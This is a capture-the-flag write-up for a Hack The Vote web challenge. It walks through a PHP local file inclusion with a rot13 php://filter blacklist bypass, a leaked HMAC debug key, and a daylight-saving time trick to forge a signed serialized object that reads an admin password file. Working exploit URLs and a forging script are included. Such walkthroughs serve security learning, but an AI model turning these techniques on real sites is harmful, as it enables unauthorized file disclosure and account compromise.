@@ -1,0 +1,189 @@
+# Writeup for the Just In Time's Hack The Vote chall
+
+**Keywords**: LFI, PHP, unserialize, time sensible
+
+**Category**: Web
+
+**Points**: 300
+
+> Somebody broke into Kentucky's voter registration system last week but the officials are only saying that they patched it instead of saying who it was. Can you find a new way into their management system and identify the attacker? After registration closes, the site will be taken offline so don't miss your chance.
+
+> Note: This challenge uses a slightly nonstandard flag format (an RSA fingerprint starting with F1:A6)
+
+> http://kentucky.pwn.republican
+
+> Hint: You should look at this challenge soon before it is too late! Draft your solution asap.
+
+At first sight you can't do much with this challenge. You can register a *Voter* AKA a *user*. And if you do so you are given an ID. This ID is a base64 containing a JSON with what looks like PHP serialized data and checksums.
+
+```
+[ "O:5:\"Voter\":6:{s:4:\"name\";s:5:\"hugo1\";s:4:\"addr\";s:4:\"addr\";s:5:\"affil\";s:11:\"Independent\";s:3:\"zip\";s:5:\"42602\";s:3:\"log\";s:16:\".\/data\/hugo1\/log\";s:8:\"show_log\";b:0;}",
+  "591a997674a692767504911ea6fab4912052e84042a204c04fb1f9d174ab1357f6a295bcf1c837293c688c6a1ff46780b48e093bc6626a9225d6a9f5d180f4fc",
+  "hugo1",
+  "8d4053c270672795a7f9eeedc8ab0afc761585dc4402d1c9b8f5dc7d3781127e4806bfbaaf6fa169c0830e6b97a2b16b8b7702e992d42331a172733ba6237f2d"]
+```
+
+You can ask the website to check your ID, and the website prints your information.
+
+Of course if you try to modify the *Voter* object the website tell you that the signature is wrong (the 1st big string). If you try to modify the third JSON parameter (**hugo1** here) then the website gives you a similar error.
+
+Okay so we might have to modify this JSON later on, when we'll find the key to sign the objects.
+
+On the website you can also go to /admin.php which ask you for a password.
+
+I have not found something interesting enough, so I continued my search.. By looking at the network accesses we can see that the website call frequently the url : ```http://kentucky.pwn.republican/inc.php?p=countdown```. When you go directly to the url you see the remaining time before the registration closes (which will be a big hint later on).
+
+As a PHP lover I immediately saw the **p** parameter which often means that a page is included. If the website is badly designed (like here) it could lead to an LFI (cf [https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion))
+
+For example : 
+
+```
+http://kentucky.pwn.republican/inc.php?p=index
+```
+
+The website home's page is displayed. So this URL includes the *index.php* file. What about reading the sources ? It can be possible if the php filters are enabled :
+
+```
+http://kentucky.pwn.republican/inc.php?p=php://filter/string.base64-encode/ressource=index
+```
+
+Mmh the website answers ```Hacking detected```. After a bit of testing we understand that the word **base64** is blacklisted. Fair enough !
+
+```
+http://kentucky.pwn.republican/inc.php?p=php://filter/string.rot13/ressource=index
+```
+
+And we have the source code ! There is a lot of files, I won't show you everything, but here are the important parts.
+
+Here is the code which checks the ID and displays your infos :
+
+```php
+function validate_voter($blob, $debug=False) {
+    $unb64 = base64_decode($blob) or html_die("Could not decode base64");
+    list($vote_s, $vote_s_sig, $name, $name_sig) = json_decode($unb64) or html_die("Could not decode json");
+
+    $system_key = get_system_key();
+    $valid_name_sig = hash_hmac("sha512", $name, $system_key);
+    hash_equals($valid_name_sig, $name_sig) or html_die("Bad signature for name");
+
+    $user_key = get_key($name);
+    if (is_test_voter($name)) {
+        html_die("$name is a testing account - it can't be used to vote");
+    }
+    if ($debug) {
+        mark_test_voter($name);
+        print("<pre>DEBUG: User signed with key " . base64_encode($user_key) . "</pre>");
+    }
+
+    $valid_vote_s_sig = hash_hmac("sha512", $vote_s, $user_key);
+    hash_equals($valid_vote_s_sig, $vote_s_sig) or html_die("Bad signature for Voter object");
+
+    $voter = unserialize($vote_s, ["Voter"]);
+    return $voter;
+}
+
+if(isset($_POST['id'])) { 
+    $debug = isset($_GET['debugpw']) && strcmp($_GET['debugpw'], "thebluegrassstate") !== false;
+    $voter_info = validate_voter($_POST['id'], $debug);
+    $voter_info = str_replace("\n", "<br>", $voter_info);
+}
+```
+
+*validate_voter* return a *Voter* object or prints an error. It checks if the serialized *Voter* or the *$name* have been modified. Before I explain how we can modify the *Voter* let me explain why we want to.
+
+In the last line we see that the *Voter* object is interpreted as a string. So the *Voter* class might have a __toString() function which is called. Here it is :
+
+```php
+function __toString() {
+    $out = "Voter registration for {$this->name}:\n\tAddress: {$this->addr}" .
+           "\n\tAffiliation: {$this->affil}\n\tZip: {$this->zip}";
+
+    if ($this->show_log)
+        $out .= "\n\nLast update to voter:\n" . $this->read_log();
+
+    return $out;
+}
+```
+
+
+The *show_log* attribute is always false.. Except if we can modify the object ! The *read_log()* reads a log file whose the path is stored in the *Voter* object. So if we can modify the object we will be able to read every files on the server ! (the LFI allowed us to read only php files due to the extension)
+
+But what file can we want to read so much ? Lets see *admin.php* :
+
+```php
+if(isset($_POST['password'])) {
+    $password = trim(file_get_contents("../admin_password"));
+    if (hash_equals($password, $_POST['password'])) {
+        /* PRINT THE FLAG */
+    }
+}
+```
+
+Well, if we can read **../admin_password** we win ! Lets try to do this :)
+
+The only way to modify the *Voter* object is by knowing the *$user_key* which is given to us as long as *$debug is True* AKA as long as we provide the right GET parameter. 
+
+So we can modify the *Voter* object and still have the good signature ! Hurrah !! Not so fast young boy.. With great power comes great responsibility. If you want to see the key then your *Voter* will be marked as a *test voter* and you are not anymore allowed to use the unserialize method with this object.
+
+Well, lets see the functions that lock our dear *Voter* :
+
+```php
+function is_test_voter($name) {
+    $f = "./data/$name/debug";
+    if (file_exists($f)) {
+        $debug_timestamp = file_get_contents($f);
+        $debug_after = DateTime::createFromFormat('m/d/y H:i', $debug_timestamp);
+
+        $now = new DateTime();
+        if ($now >= $debug_after) {
+            return True;
+        }
+    }
+    return False;
+}
+
+function mark_test_voter($name, $raw_date=null) {
+    $f = "./data/$name/debug";
+    if (file_exists($f)) return;
+
+    if (!isset($raw_date)) $raw_date = new DateTime();
+    $date = $raw_date->format('m/d/y H:i');
+
+    file_put_contents($f, $date) or die("Couldn't mark $name as test voter" . PHP_EOL);
+    chmod($f, 0400);
+
+    file_put_contents("./data/$name/log", "Marked $name as test voter at $date" . PHP_EOL, FILE_APPEND);
+}
+```
+
+So a *Voter* is locked if the date in his debug file is greater or equals to the current date. In a strictly scientific way of thinking we are screwed ! We cannot go back in the past. I blocked at this point a long time before looking at the hint : *"You should look at this challenge soon before it is too late! Draft your solution asap."*
+
+Why set a limit to the challenge ? Then I remembered that once a year we do go back in time to save power ! Would it be possible in the city where the server has its timezone this temporal breach would occur in the CTF ? That would be awesome !
+
+Here is the first line of **util.php**:
+```php
+date_default_timezone_set('America/New_York');
+```
+
+After a bit of googling : [https://www.timeanddate.com/time/change/usa/new-york](https://www.timeanddate.com/time/change/usa/new-york)
+
+Yes ! At 02:00am the server time will go back from 1hour :D So if we ask for the key at 01:30am then our *Voter* object will be locked as long as datetime >= 01:30am. But half an hour later the time will be... 01:00am ! So we will have a 1/2h to modify our object and read the admin password.
+
+Sadly for me 01:30am New York time meant 05:30am.. So I'll have to wake up early ;). But it was worth it. Here is the php code used to modify the *Voter* user :
+
+```php
+list($vote_s, $vote_s_sig, $name, $name_sig) = json_decode(base64_decode(YOUR_ID)); // 01:30am -> register
+$user_key_b64 = "THE_USER_KEY"; // 01:30am -> debug http://kentucky.pwn.republican/check_reg.php?debugpw=thebluegrassstate
+
+$vote_s = "O:5:\"Voter\":6:{s:4:\"name\";s:4:\"hugo\";s:4:\"addr\";s:4:\"addr\";s:5:\"affil\";s:11:\"Independent\";s:3:\"zip\";s:5:\"42602\";s:3:\"log\";s:17:\"../admin_password\";s:8:\"show_log\";b:1;}"; // read psswd admin
+
+$user_key = base64_decode($user_key_b64);
+$vote_s_sig = hash_hmac("sha512", $vote_s, $user_key);
+$blob = base64_encode(json_encode([$vote_s, $vote_s_sig, $name, $name_sig]));
+
+var_dump($blob); // check_reg from "02:00am" to "02:29am"
+```
+
+It was early so I forgot to save the admin password and the flag. But I hope believe me when I say that it worked :D
+
+This challenge was a real peace of art. The fact that the *real world* is influencing the behavior of a program is awesome ! Without this time change nothing was possible. The author is really a genius, thanks a lot !
